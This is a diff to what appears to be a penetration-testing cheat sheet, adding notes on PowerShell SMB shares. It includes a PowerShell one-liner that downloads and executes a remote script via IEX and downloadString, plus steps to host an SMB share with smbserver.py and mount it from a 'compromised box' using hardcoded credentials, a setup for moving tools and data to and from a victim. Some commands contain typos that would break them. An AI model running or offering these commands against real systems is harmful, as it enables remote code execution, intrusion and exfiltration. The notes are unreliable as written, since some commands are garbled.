@@ -67,3 +67,13 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 --------------------------------------
 # Powershell download a file
 powershell "IEX(New Object Net.WebClient).downloadString('http://<targetip>/file.ps1')"
+
+## Powershell SMB Shares
+
+# Localhost
+python3 smbserver.py MyFiles smbfileshare -smb2support -user etherk1ll -password password123
+
+# Compromised box
+1. $pass = convertto-securestring 'password123' -AsPlainText -Force
+2. $cred = New-Object Systemn.Management.Automation.PSCredential('etherk1ll', $pass)
+3. New-PSDrive -Name etherk1ll -PSProvider FileSystem -Credential $cred -\r-Root \\10.10.14.18\MyFiles
